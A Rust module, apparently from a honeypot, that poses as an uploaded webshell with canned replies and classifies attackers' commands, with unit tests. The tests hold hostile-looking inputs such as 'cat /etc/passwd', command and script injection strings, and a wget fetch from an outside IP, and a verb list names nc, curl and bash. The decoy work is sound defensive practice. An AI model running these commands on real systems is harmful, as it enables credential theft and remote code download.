//! Requests to a path this node told an uploader its file landed at
//! (MIK-121): answered as the webshell the file would be, from a short list
//! of canned replies, and never with anything the upload carried.
//!
//! [`reply`] takes only the command and the node's site word, so no reply
//! can be derived from stored content.
use std::collections::{HashMap, VecDeque};
use std::sync::Mutex;

/// The most answered paths held; past it the oldest goes.
pub const MAX_PATHS: usize = 50_000;

/// The parameters a webshell reads its command from, first present wins.
const PARAMS: [&str; 8] = [
    "cmd", "c", "command", "exec", "execute", "run", "shell", "x",
];

/// The longest command kept, in bytes.
const MAX_CMD: usize = 256;

/// The verbs the public dashboard names; any other counts as `other`.
const VERBS: [&str; 21] = [
    "id", "whoami", "uname", "pwd", "hostname", "echo", "ls", "cat", "cd", "ps", "wget", "curl",
    "chmod", "rm", "nc", "bash", "sh", "python", "perl", "php", "base64",
];

/// This node's answered paths: exact, and prefixes (a plugin's or theme's
/// folder), each to the uid of the latest upload answered there.
#[derive(Default)]
pub struct PathMap(Mutex<Paths>);

#[derive(Default)]
struct Paths {
    exact: HashMap<String, (u64, String)>,
    prefix: HashMap<String, (u64, String)>,
    /// Insertion order, for the bound: (seq, path, is prefix).
    order: VecDeque<(u64, String, bool)>,
    seq: u64,
}

impl PathMap {
    /// The map of this node's latest uploads (`origin`: its id, None when
    /// standalone), as the trap starts. A read that fails leaves it empty:
    /// those paths get the trap's usual answer.
    pub async fn load(store: &crate::store::Store, origin: Option<&[u8]>) -> Self {
        let m = Self::default();
        let rows = match store.pool.acquire().await {
            Ok(mut c) => crate::store::uploads::answered_paths(&mut c, origin, MAX_PATHS).await,
            Err(e) => Err(e.into()),
        };
        match rows {
            Ok(rows) => {
                for (path, prefix, uid) in rows {
                    m.insert(&path, prefix, &uid);
                }
            }
            Err(e) => tracing::warn!(error = %e, "trap: loading the answered upload paths failed"),
        }
        m
    }

    /// Add an answered path, evicting the oldest past [`MAX_PATHS`].
    pub fn insert(&self, path: &str, is_prefix: bool, uid: &str) {
        self.insert_bounded(path, is_prefix, uid, MAX_PATHS);
    }

    /// Answer `path` from now on, before its upload is recorded (no uid
    /// yet); [`Self::settle`] then names the upload or takes it back.
    pub fn reserve(&self, path: &str, is_prefix: bool) -> u64 {
        self.insert_bounded(path, is_prefix, "", MAX_PATHS)
    }

    /// Settle what [`Self::reserve`] returned `seq` for: the recorded
    /// upload's uid, or None to stop answering the path. A path answered
    /// again since is left to its later entry.
    pub fn settle(&self, path: &str, is_prefix: bool, seq: u64, uid: Option<&str>) {
        let mut p = self.0.lock().unwrap();
        let map = if is_prefix {
            &mut p.prefix
        } else {
            &mut p.exact
        };
        if map.get(path).is_none_or(|(at, _)| *at != seq) {
            return;
        }
        match uid {
            Some(uid) => map.insert(path.to_string(), (seq, uid.to_string())),
            None => map.remove(path),
        };
    }

    fn insert_bounded(&self, path: &str, is_prefix: bool, uid: &str, max: usize) -> u64 {
        let mut p = self.0.lock().unwrap();
        p.seq += 1;
        let seq = p.seq;
        let map = if is_prefix {
            &mut p.prefix
        } else {
            &mut p.exact
        };
        map.insert(path.to_string(), (seq, uid.to_string()));
        p.order.push_back((seq, path.to_string(), is_prefix));
        while p.order.len() > max {
            let Some((s, old, pre)) = p.order.pop_front() else {
                break;
            };
            let map = if pre { &mut p.prefix } else { &mut p.exact };
            // A path answered again since is held by its later entry.
            if map.get(&old).is_some_and(|(at, _)| *at == s) {
                map.remove(&old);
            }
        }
        seq
    }

    /// The upload answered at `path`: the exact path, else the deepest
    /// prefix folder (each ends in `/`) it lies under.
    pub fn lookup(&self, path: &str) -> Option<String> {
        let p = self.0.lock().unwrap();
        if let Some((_, uid)) = p.exact.get(path) {
            return Some(uid.clone());
        }
        if p.prefix.is_empty() {
            return None;
        }
        path.rmatch_indices('/')
            .find_map(|(i, _)| p.prefix.get(&path[..=i]))
            .map(|(_, uid)| uid.clone())
    }

    pub fn len(&self) -> usize {
        let p = self.0.lock().unwrap();
        p.exact.len() + p.prefix.len()
    }

    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }
}

/// The command a request sends its webshell: the first of [`PARAMS`]
/// present in the query, else in the form body, cut to [`MAX_CMD`] bytes.
pub fn extract_command(query: Option<&str>, form: Option<&[u8]>) -> Option<String> {
    let parse = |s: &[u8]| serde_urlencoded::from_bytes::<Vec<(String, String)>>(s).ok();
    let query = query.and_then(|q| parse(q.as_bytes())).unwrap_or_default();
    let form = form.and_then(parse).unwrap_or_default();
    PARAMS.iter().find_map(|name| {
        query
            .iter()
            .chain(form.iter())
            .find(|(k, _)| k == name)
            .map(|(_, v)| cut(v, MAX_CMD).to_string())
    })
}

/// `s` cut to at most `max` bytes, on a character boundary.
fn cut(s: &str, max: usize) -> &str {
    if s.len() <= max {
        return s;
    }
    let mut end = max;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

/// The reply to `cmd` on a node whose site word is `word`: a canned line
/// for the few commands on the list, an echoed marker, else nothing.
/// Always 200, as a webshell that ran the command would be.
pub fn reply(cmd: &str, word: &str) -> (u16, String) {
    let body = match cmd.trim() {
        "id" => "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n".to_string(),
        "whoami" => "www-data\n".to_string(),
        "uname -a" => format!(
            "Linux {word} 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n"
        ),
        "pwd" => "/var/www/html\n".to_string(),
        "hostname" => format!("{word}\n"),
        c => echo(c).map(|m| format!("{m}\n")).unwrap_or_default(),
    };
    (200, body)
}

/// The marker of `echo <marker>`, only when it is a plain token: nothing
/// that could render as markup or turn the decoy into an echo service.
fn echo(cmd: &str) -> Option<&str> {
    let rest = cmd.strip_prefix("echo")?;
    if !rest.starts_with(char::is_whitespace) {
        return None;
    }
    let m = rest.trim();
    let plain = (1..=64).contains(&m.len())
        && m.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-');
    plain.then_some(m)
}

/// The command's verb for the public dashboard: its first word without
/// its folder, lowercased, if on the list, else `other`.
pub fn verb(cmd: &str) -> &'static str {
    let first = cmd.split_whitespace().next().unwrap_or("");
    let name = first.rsplit('/').next().unwrap_or("").to_ascii_lowercase();
    VERBS
        .iter()
        .find(|v| **v == name)
        .copied()
        .unwrap_or("other")
}

#[cfg(test)]
mod tests {
    use super::*;

    const WORD: &str = "orchid";

    #[test]
    fn a_reserved_path_answers_until_settled() {
        let m = PathMap::default();
        let a = m.reserve("/a.php", false);
        assert_eq!(m.lookup("/a.php").as_deref(), Some(""));
        m.settle("/a.php", false, a, Some("u1"));
        assert_eq!(m.lookup("/a.php").as_deref(), Some("u1"));
        let b = m.reserve("/b/", true);
        assert_eq!(m.lookup("/b/x.php").as_deref(), Some(""));
        m.settle("/b/", true, b, None);
        assert_eq!(m.lookup("/b/x.php"), None);
        // A later upload to the same path is not undone by an earlier one.
        let c1 = m.reserve("/c.php", false);
        let c2 = m.reserve("/c.php", false);
        m.settle("/c.php", false, c1, None);
        assert_eq!(m.lookup("/c.php").as_deref(), Some(""));
        m.settle("/c.php", false, c2, Some("u2"));
        assert_eq!(m.lookup("/c.php").as_deref(), Some("u2"));
    }

    #[test]
    fn canned_commands() {
        let body = |c| reply(c, WORD).1;
        assert_eq!(
            body("id"),
            "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
        );
        assert_eq!(body("whoami"), "www-data\n");
        assert!(body("uname -a").starts_with("Linux orchid 5.15.0-91-generic "));
        assert!(body("uname -a").ends_with("GNU/Linux\n"));
        assert_eq!(body("pwd"), "/var/www/html\n");
        assert_eq!(body("hostname"), "orchid\n");
        assert_eq!(body("echo abc_1"), "abc_1\n");
        assert_eq!(reply("id", WORD).0, 200);
    }

    #[test]
    fn echo_takes_only_a_plain_marker() {
        for c in [
            "echo <script>",
            "echo <script>alert(1)</script>",
            "echo a\nb",
            "echo $(id)",
            "echo `id`",
            "echo a b",
            "echo",
            "echo ",
            "echoabc",
            &format!("echo {}", "a".repeat(65)),
        ] {
            assert_eq!(reply(c, WORD), (200, String::new()), "{c:?}");
        }
        assert_eq!(reply(&format!("echo {}", "a".repeat(64)), WORD).1.len(), 65);
    }

    #[test]
    fn anything_else_is_an_empty_200() {
        for c in ["", "ls -la", "cat /etc/passwd", "id; ls", "uname", "ID"] {
            assert_eq!(reply(c, WORD), (200, String::new()), "{c:?}");
        }
    }

    #[test]
    fn command_from_query_then_form() {
        assert_eq!(extract_command(Some("cmd=id"), None).as_deref(), Some("id"));
        assert_eq!(
            extract_command(Some("a=1&c=uname+-a"), None).as_deref(),
            Some("uname -a")
        );
        // The list's order decides, not the request's.
        assert_eq!(
            extract_command(Some("x=pwd&cmd=whoami"), None).as_deref(),
            Some("whoami")
        );
        assert_eq!(
            extract_command(None, Some(b"exec=hostname")).as_deref(),
            Some("hostname")
        );
        assert_eq!(
            extract_command(Some("q=1"), Some(b"cmd=id")).as_deref(),
            Some("id")
        );
        assert_eq!(extract_command(Some("q=1"), None), None);
        assert_eq!(extract_command(None, None), None);
        let long = extract_command(Some(&format!("cmd={}", "é".repeat(200))), None).unwrap();
        assert!(long.len() <= MAX_CMD && long.chars().all(|c| c == 'é'));
    }

    #[test]
    fn exact_and_prefix_lookups() {
        let m = PathMap::default();
        m.insert("/x/a.php", false, "u1");
        m.insert("/wp-content/plugins/hello/", true, "u2");
        assert_eq!(m.lookup("/x/a.php").as_deref(), Some("u1"));
        assert_eq!(m.lookup("/x/a.php/"), None);
        assert_eq!(m.lookup("/x/"), None);
        assert_eq!(
            m.lookup("/wp-content/plugins/hello/shell.php").as_deref(),
            Some("u2")
        );
        assert_eq!(
            m.lookup("/wp-content/plugins/hello/inc/x.php").as_deref(),
            Some("u2")
        );
        assert_eq!(
            m.lookup("/wp-content/plugins/hello/").as_deref(),
            Some("u2")
        );
        assert_eq!(m.lookup("/wp-content/plugins/hello"), None);
        assert_eq!(m.lookup("/wp-content/plugins/hello2/x.php"), None);
        assert_eq!(m.lookup("/wp-content/plugins/"), None);
    }

    #[test]
    fn the_bound_evicts_the_oldest() {
        let m = PathMap::default();
        m.insert_bounded("/a", false, "ua", 2);
        m.insert_bounded("/b/", true, "ub", 2);
        m.insert_bounded("/c", false, "uc", 2);
        assert_eq!(m.lookup("/a"), None);
        assert_eq!(m.lookup("/b/x").as_deref(), Some("ub"));
        assert_eq!(m.lookup("/c").as_deref(), Some("uc"));
        assert_eq!(m.len(), 2);
        // A path answered again keeps its later upload past the earlier's
        // eviction.
        m.insert_bounded("/c", false, "uc2", 2);
        m.insert_bounded("/d", false, "ud", 2);
        assert_eq!(m.lookup("/b/x"), None);
        assert_eq!(m.lookup("/c").as_deref(), Some("uc2"));
        assert_eq!(m.lookup("/d").as_deref(), Some("ud"));
    }

    #[test]
    fn verbs() {
        assert_eq!(verb("/usr/bin/wget http://198.51.100.7/x"), "wget");
        assert_eq!(verb("  uname -a"), "uname");
        assert_eq!(verb("CURL -O x"), "curl");
        assert_eq!(verb("id"), "id");
        assert_eq!(verb("foo"), "other");
        assert_eq!(verb(""), "other");
        assert_eq!(verb("/"), "other");
    }
}
